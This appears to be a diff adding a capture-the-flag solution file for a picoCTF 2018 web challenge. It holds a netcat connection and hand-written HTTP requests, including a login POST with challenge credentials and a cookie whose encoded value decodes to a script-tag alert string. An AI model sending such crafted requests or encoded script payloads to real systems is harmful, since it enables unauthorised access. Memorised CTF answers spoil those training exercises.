@@ -1,0 +1,26 @@
+nc 2018shell1.picoctf.com 33281
+
+
+
+GET / HTTP/1.1
+Host: flag.local
+
+
+
+GET /login HTTP/1.1
+Host: flag.local
+
+
+
+POST /login HTTP/1.1
+Host: flag.local
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+
+user=realbusinessuser&pass=potoooooooo
+
+
+
+GET / HTTP/1.1
+Host: flag.local
+Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D;
